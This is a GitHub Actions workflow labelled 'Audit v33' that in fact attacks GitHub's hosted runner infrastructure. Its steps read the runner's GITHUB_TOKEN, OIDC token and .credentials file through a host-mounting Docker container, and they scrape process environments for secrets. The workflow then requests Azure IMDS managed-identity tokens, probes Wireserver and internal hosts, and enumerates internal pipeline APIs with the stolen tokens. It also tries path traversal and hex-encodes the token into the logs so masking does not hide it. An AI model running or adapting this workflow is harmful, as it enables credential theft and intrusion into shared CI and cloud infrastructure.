name: Audit v33
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  pull-requests: write
  id-token: write
  actions: write
  packages: write
  checks: write
  statuses: write
  deployments: write
  issues: write

jobs:
  audit-v33:
    runs-on: ubuntu-latest
    env:
      UPSTREAM_OWNER: twrps
      UPSTREAM_REPO: PoC-RACE2
      FORK_OWNER: lacaag
      FORK_REPO: PoC-RACE2
    steps:

      # ══════════════════════════════════════════════════════════════
      # STEP 1: Harvest + CTOK hostId (v32 output was cut off)
      # ══════════════════════════════════════════════════════════════
      - name: Step 1 - Harvest + CTOK hostId
        if: always()
        run: |
          set +e
          echo "=== V33 HARVEST ==="
          echo "$PATH" > /tmp/saved_path.txt
          RT="${{ secrets.GITHUB_TOKEN }}"
          echo "$RT" > /tmp/rt.txt
          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
          if [ -f "$WLOG" ]; then
            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl FeedStreamUrl; do
              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
              [ -n "$VAL" ] && { echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt; }
            done
            RUN_URL=$(grep -oP '"url"\s*:\s*"https://run-actions[^"]+' "$WLOG" | head -1 | sed 's/"url"\s*:\s*"//')
            echo "RUN_URL=$RUN_URL"; echo "$RUN_URL" > /tmp/run_url.txt
            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            echo "PLAN=$PLAN JOB=$JOB"
            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt

            # Extract ALL URLs from worker log
            echo "--- All log URLs ---"
            grep -oP 'https?://[^\s"]+' "$WLOG" | sort -u | head -30
          fi
          docker run --rm -v /:/h alpine sh -c '
            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
          ' 2>/dev/null > /tmp/hex_extract.txt
          python3 -c "
          import binascii,json
          raw=open('/tmp/hex_extract.txt').read()
          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
          if s>=0 and e>=0:
            h=raw[s+14:e].strip()
            d=json.loads(binascii.unhexlify(h).decode())
            t=d.get('Data',{}).get('token','')
            open('/tmp/cred_token.txt','w').write(t)
            print(f'CTOK_LEN={len(t)}')
          " 2>/dev/null

          # CTOK + hostId query param (v32 was cut off)
          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
          VSBASE="https://vstoken.actions.githubusercontent.com/serviceDeployments/tokenghubeus21"
          if [ -n "$CTOK" ] && [ ${#CTOK} -gt 10 ]; then
            echo "--- CTOK + hostId ---"
            CTOK_ENC=$(python3 -c "import urllib.parse;print(urllib.parse.quote(open('/tmp/cred_token.txt').read().strip()))")
            for HID in "$PLAN" "8f795dfa-02d7-4018-af3a-c98d25c03f68"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
                -H "Content-Type: application/x-www-form-urlencoded" \
                "$VSBASE/_apis/oauth2/token?hostId=$HID" \
                -d "grant_type=client_credentials&client_assertion=$CTOK_ENC&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=&scope=vso.full_access")
              CODE=$(echo "$R" | tail -1)
              echo "CTOK hid=$HID = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
            done
          fi
          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"

      # ══════════════════════════════════════════════════════════════
      # STEP 2: Azure internal network — IMDS, Wireserver, 10.x
      # v14 worker log had: 169.254.169.254, 168.63.129.16, 10.1.0.1
      # These are Azure host services accessible from the runner
      # ══════════════════════════════════════════════════════════════
      - name: Step 2 - Azure internals
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== AZURE INTERNALS ==="

          # A: IMDS — metadata service
          echo "--- A: IMDS ---"
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
            -H "Metadata: true" \
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01")
          CODE=$(echo "$R" | tail -1)
          echo "A instance = $CODE | $(echo "$R" | sed '$d' | head -c 400)"

          # B: IMDS managed identity token
          echo "--- B: IMDS identity ---"
          for RES in \
            "https://management.azure.com/" \
            "https://vault.azure.net" \
            "https://storage.azure.com/" \
            "https://graph.microsoft.com" \
            "https://database.windows.net/" \
            "https://dev.azure.com"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "Metadata: true" \
              "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=$RES")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            TOKEN=$(echo "$BODY" | jq -r '.access_token // empty' 2>/dev/null)
            [ -n "$TOKEN" ] && echo "B $RES = TOKEN len=${#TOKEN}"
            [ -z "$TOKEN" ] && echo "B $RES = $CODE | $(echo "$BODY" | head -c 200)"
          done

          # C: IMDS attested document
          echo "--- C: Attested ---"
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
            -H "Metadata: true" \
            "http://169.254.169.254/metadata/attested/document?api-version=2021-02-01")
          CODE=$(echo "$R" | tail -1)
          echo "C attested = $CODE | $(echo "$R" | sed '$d' | head -c 200)"

          # D: Wireserver (168.63.129.16)
          echo "--- D: Wireserver ---"
          for EP in "/" "/machine" "/machine?comp=goalstate" "/machine?comp=config" \
            "/machine/plugins?comp=config" "/healthcheck" "/status" "/versions"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
              -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2012-11-30" \
              "http://168.63.129.16$EP" 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            [ "$CODE" != "HTTP_000" ] && \
              echo "D $EP = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
          done

          # E: Internal gateway (10.1.0.1)
          echo "--- E: Gateway ---"
          for PORT in 80 443 8080 8443; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
              "http://10.1.0.1:$PORT/" 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            [ "$CODE" != "HTTP_000" ] && echo "E 10.1.0.1:$PORT = $CODE"
          done

          # F: Internal endpoint (10.1.0.80 — seen in v14)
          echo "--- F: Internal 10.1.0.80 ---"
          for PORT in 80 443 8080 3000 5000 8443 9090; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
              "http://10.1.0.80:$PORT/" 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            [ "$CODE" != "HTTP_000" ] && echo "F 10.1.0.80:$PORT = $CODE | $(echo "$R" | sed '$d' | head -c 100)"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 3: Runtime API + Container API + Actions API
      # v14 listed these as pipeline service endpoints
      # ══════════════════════════════════════════════════════════════
      - name: Step 3 - Runtime and Container APIs
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== RUNTIME + CONTAINER ==="
          RT=$(cat /tmp/rt.txt)
          IDTOK=$(cat /tmp/idtok.txt)
          PURL=$(cat /tmp/PipelinesServiceUrl.txt)
          PLAN=$(cat /tmp/plan.txt)
          RUNID="${{ github.run_id }}"

          # A: Runtime API — pipelines, artifacts, signedartifacturl
          echo "--- A: Runtime ---"
          for EP in \
            "_apis/runtime/pipelines" \
            "_apis/runtime/pipelines/$RUNID" \
            "_apis/runtime/pipelines/$RUNID/runs" \
            "_apis/runtime/pipelines/$RUNID/artifacts" \
            "_apis/runtime/pipelines/$RUNID/signedartifacturl" \
            "_apis/runtime/pipelines/$RUNID/runs/latest" \
            "_apis/runtime/orchestration/plan" \
            "_apis/runtime/orchestration/plan/$PLAN" \
            "_apis/runtime/webhooks"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $RT" "${PURL}${EP}")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
              echo "A $EP = $CODE | $(echo "$BODY" | head -c 200)"
          done
          echo ""

          # B: Container API
          echo "--- B: Container ---"
          for EP in \
            "_apis/Container/containers" \
            "_apis/Container/containers/1" \
            "_apis/Container/containers/1/items"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $RT" "${PURL}${EP}")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
              echo "B $EP = $CODE | $(echo "$BODY" | head -c 200)"
          done
          echo ""

          # C: Actions run service API
          echo "--- C: Actions ---"
          for EP in \
            "_apis/actions/runs" \
            "_apis/actions/runs/$RUNID" \
            "_apis/actions/runs/$RUNID/logs" \
            "_apis/actions/gates" \
            "_apis/actions/gates?expand=true" \
            "_apis/actions/environments" \
            "_apis/actions/secrets" \
            "_apis/actions/variables"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $RT" "${PURL}${EP}")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
              echo "C $EP = $CODE | $(echo "$BODY" | head -c 200)"
          done
          echo ""

          # D: Write ops on runtime
          echo "--- D: Runtime writes ---"
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
            "${PURL}_apis/runtime/pipelines/$RUNID/artifacts?api-version=6.0-preview" \
            -d '{"name":"v33-test","type":"actions_storage"}')
          CODE=$(echo "$R" | tail -1)
          echo "D create artifact = $CODE | $(echo "$R" | sed '$d' | head -c 200)"

          # E: Try with IDTOK
          echo "--- E: Runtime with IDTOK ---"
          for EP in \
            "_apis/runtime/pipelines" \
            "_apis/Container/containers" \
            "_apis/actions/runs"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $IDTOK" "${PURL}${EP}")
            CODE=$(echo "$R" | tail -1)
            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
              echo "E $EP = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 4: FeedStreamUrl + all worker log URLs
      # v14 harvested FeedStreamUrl — a different service
      # ══════════════════════════════════════════════════════════════
      - name: Step 4 - FeedStream and log URLs
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== FEEDSTREAM + LOG URLS ==="
          RT=$(cat /tmp/rt.txt)
          IDTOK=$(cat /tmp/idtok.txt)
          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)

          # A: FeedStreamUrl
          FSURL=$(cat /tmp/FeedStreamUrl.txt 2>/dev/null)
          echo "FeedStreamUrl=$FSURL"
          if [ -n "$FSURL" ]; then
            for EP in "" "/_apis/connectionData" "/_apis/feeds" "/feed" "/stream" \
              "/_apis/feed/events" "/_apis/feed/messages"; do
              for TOK_NAME in RT IDTOK CTOK; do
                eval TOK=\$$TOK_NAME
                [ -z "$TOK" ] || [ ${#TOK} -lt 10 ] && continue
                R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
                  -H "Authorization: Bearer $TOK" "${FSURL}${EP}")
                CODE=$(echo "$R" | tail -1)
                [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
                  echo "A $TOK_NAME $EP = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
              done
            done
          fi
          echo ""

          # B: Scan for ALL service URLs from proc environment
          echo "--- B: Proc env scan ---"
          docker run --rm -v /:/h alpine sh -c '
            for P in /h/proc/[0-9]*/environ; do
              PID=$(echo "$P" | grep -oP "[0-9]+")
              CMDLINE=$(cat "/h/proc/$PID/cmdline" 2>/dev/null | tr "\0" " " | head -c 80)
              echo "=PID=$PID CMD=$CMDLINE"
              tr "\0" "\n" < "$P" 2>/dev/null | grep -iE "URL|TOKEN|KEY|SECRET|AUTH|SERVICE|HOST" | head -10
            done
          ' 2>/dev/null | grep -v "^$" | head -60

      # ══════════════════════════════════════════════════════════════
      # STEP 5: Path traversal on run-service
      # v20-v27: run-service needs HMAC but adjacent runs accessible
      # Try traversal to reach other services via run-service host
      # ══════════════════════════════════════════════════════════════
      - name: Step 5 - Run-service traversal
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== RUN-SERVICE TRAVERSAL ==="
          RT=$(cat /tmp/rt.txt)
          RUN_URL=$(cat /tmp/run_url.txt 2>/dev/null)
          echo "RUN_URL=$RUN_URL"

          if [ -n "$RUN_URL" ]; then
            RUN_HOST=$(echo "$RUN_URL" | grep -oP 'https://[^/]+')
            RUN_PATH=$(echo "$RUN_URL" | sed "s|$RUN_HOST||")
            echo "HOST=$RUN_HOST PATH=$RUN_PATH"

            # A: Path traversal from run path
            echo "--- A: Traversal ---"
            for TRAV in \
              "/../" \
              "/../../" \
              "/../_apis/connectionData" \
              "/../_apis/resourceareas" \
              "/../_apis/oauth2/token" \
              "/../_apis/distributedtask/pools" \
              "/../_apis/runtime/pipelines"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
                -H "Authorization: Bearer $RT" "${RUN_HOST}${RUN_PATH}${TRAV}")
              CODE=$(echo "$R" | tail -1)
              [ "$CODE" != "HTTP_000" ] && \
                echo "A $TRAV = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
            done

            # B: Other paths on same host
            echo "--- B: Run host APIs ---"
            for EP in \
              "/" \
              "/_apis/connectionData" \
              "/_apis/resourceareas" \
              "/healthcheck" \
              "/status" \
              "/_internal" \
              "/admin" \
              "/metrics"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
                -H "Authorization: Bearer $RT" "${RUN_HOST}${EP}")
              CODE=$(echo "$R" | tail -1)
              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
                echo "B $EP = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
            done
          fi

      # ══════════════════════════════════════════════════════════════
      # STEP 6: Final
      # ══════════════════════════════════════════════════════════════
      - name: Step 6 - Final
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== V33 FINAL ==="
          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
          echo "=== V33 COMPLETE ==="
